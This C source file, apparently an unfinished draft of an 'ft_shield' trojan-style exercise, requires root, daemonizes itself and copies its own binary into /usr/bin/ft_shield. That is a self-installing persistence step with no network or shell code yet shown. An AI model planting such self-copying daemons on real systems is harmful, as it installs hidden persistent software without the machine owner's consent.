#include "../include/ft_shield.h"

void	ft_error(char *str)
{
	write(2, str, strlen(str));
	exit(1);
}

void	handle_signal(int sig)
{
	if (sig == SIGTERM)
		exit(0);
}

void	setup_signals(void)
{
	struct sigaction sa;
	sa.sa_handler = handle_signal;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = 0;
	if (sigaction(SIGTERM, &sa, NULL) < 0)
		ft_error("sigaction");
	return;
}

bool	is_bin(void)
{
	char	path[PATH_MAX], rpath[PATH_MAX];
	ssize_t	len;

	len = readlink("/proc/self/exe", path, sizeof(path)-1);
	if (len == -1)
		ft_error("readlink");
	if (!realpath(path, rpath))
		ft_error("realpath");
	if (strcmp("/usr/bin", dirname(rpath)))
		return false;
	return true;
}

void	create_daemon(void)
{
	// int		fd;
	pid_t	pid = fork();

	if (pid < 0)
		ft_error("fork");
	if (pid)
		exit(0);
	if (setsid() < 0)
		ft_error("setsid");
	if (chdir("/") < 0)
		ft_error("chdir");
	umask(0);
	// fd = open("/dev/null", O_RDWR);
	// if (fd < 0)
	// 	ft_error("open");
	// if (dup2(fd, STDIN_FILENO) < 0)
	// 	ft_error("dup stdin");
	// if (dup2(fd, STDOUT_FILENO) < 0)
	// 	ft_error("dup stdout");
	// if (dup2(fd, STDERR_FILENO) < 0)
	// 	ft_error("dup stderr");
	// if (close(fd) < 0)
	// 	ft_error("close fd");
	return ;
}

void	move_to_target()
{
	if (!access("/usr/bin/ft_shield", F_OK))
	{
		// I need to check the checksum of the binary to see if the same binary or not
		return;
	}
	char	bin_path[PATH_MAX], buff[4096];
	ssize_t	len = readlink("/proc/self/exe", bin_path, sizeof(bin_path)-1);
	int		src_fd, dst_fd, read_count, write_count;
	if (len == -1)
		ft_error("readlink");
	bin_path[len] = 0;
	printf("%s\n", bin_path);
	src_fd = open(bin_path, O_RDONLY);
	if (src_fd < 0)
		ft_error("open src");
	dst_fd = open("/usr/bin/ft_shield", O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (dst_fd < 0)
		ft_error("open dst");
	while ((read_count = read(src_fd, buff, sizeof(buff))) > 0)
	{
		write_count = write(dst_fd, buff, read_count);
		if (read_count != write_count)
		{
			close(src_fd);
			close(dst_fd);
			ft_error("write");
		}
	}
	close(src_fd);
	close(dst_fd);
	if (read_count < 0)
		ft_error("read");
	return;
}

int	main()
{
	if (getegid())
		ft_error(SUDO);
	printf("%s", LOGINS);
	setup_signals();
	if (is_bin())
	{
		write(1, "I'm in /bin\n", 12);
	}
	else
	{
		write(1, "I'm not in /bin\n", 16);
		create_daemon();
		move_to_target();

	}
}